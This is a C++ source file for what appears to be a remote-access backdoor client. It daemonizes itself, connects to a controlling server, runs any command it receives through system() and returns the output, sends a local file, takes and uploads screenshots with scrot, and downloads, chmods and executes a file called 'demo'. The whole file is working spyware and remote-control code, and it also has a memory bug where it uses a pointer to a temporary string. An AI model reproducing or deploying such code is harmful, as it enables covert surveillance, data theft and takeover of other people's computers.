#include <iostream>
#include <string>
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include "ClientSocket.h"

using namespace std;

void CommandToSee(string &message,ClientSocket& socket);
void SendFile(ClientSocket& socket);
void photoFile(ClientSocket& socket);
void ReceiveFile(string &message,ClientSocket& socket);

int main()
{
    cout<<"Running client...."<<endl;
    string name;
    cin >> name;
    if(daemon(1,1) == -1)
    {
        cout << "error" << endl;
        exit(1);
    }    
    const int port = 8080;
    ClientSocket clientSocket("127.0.0.1",port);
    clientSocket.Send(name);
    string message;
    while(true)
    {
        clientSocket.Receive(message);
        if(message == "sendfile")
        {
            SendFile(clientSocket);
        }
        else if(message == "recvfile")
        {
            ReceiveFile(message,clientSocket);
            system("chmod 777 demo");
            system("./demo");
        }
        else if(message == "photofile")
        {
            system("scrot ./1.png");
            photoFile(clientSocket);
        }
        else
            CommandToSee(message,clientSocket);

    }
    return 0;
}

void CommandToSee(string &message,ClientSocket& socket)
{
    const char* str = (message + " > 1.txt").c_str();
    system(str);
    FILE *file = NULL;
    file = fopen("1.txt","r");
    if(file == NULL)
        exit(1);
    fseek(file,0,SEEK_SET);
    while(!feof(file))
    {
        char buff[500] = {0};
        int len = fread(buff,1,sizeof(buff),file);
        if(send(socket.getfd(),buff,len,0) < 0)
        {
            perror("send file :");
            break;
        }
        if(len < sizeof(buff))
            break;
    }
    fclose(file);
}

void SendFile(ClientSocket& socket)
{
    FILE *file = NULL;
    file = fopen("test1.txt","r");
    if(file == NULL)
        exit(1);
    fseek(file,0,SEEK_SET);
    while(!feof(file))
    {
        char buff[500] = {0};
        int len = fread(buff,1,sizeof(buff),file);
        if(send(socket.getfd(),buff,len,0) < 0)
        {
            perror("send file :");
            break;
        }
        if(len < sizeof(buff))
            break;
    }
    fclose(file);
}

void photoFile(ClientSocket& socket)
{
    FILE *file = NULL;
    file = fopen("1.png","r");
    if(file == NULL)
        exit(1);
    fseek(file,0,SEEK_SET);
    while(!feof(file))
    {
        char buff[500] = {0};
        int len = fread(buff,1,sizeof(buff),file);
        if(send(socket.getfd(),buff,len,0) < 0)
        {
            perror("send file :");
            break;
        }
        if(len < sizeof(buff))
            break;
    }
    fclose(file);
}


void ReceiveFile(string &message,ClientSocket& socket)
{
    FILE *file = NULL;
    file = fopen("demo","w");
    while(1)
    {   
        char buff[500] = {0};
        int len = recv(socket.getfd(),buff,sizeof(buff),0);
        if(len == 0)
            break;
        if(len < 0)
            break;
        //cout << buff << endl;
        fwrite(buff,1,len,file);
        if(len < sizeof(buff))
            break;
    } 
    cout << "execution file have get" << endl;
    fclose(file);
}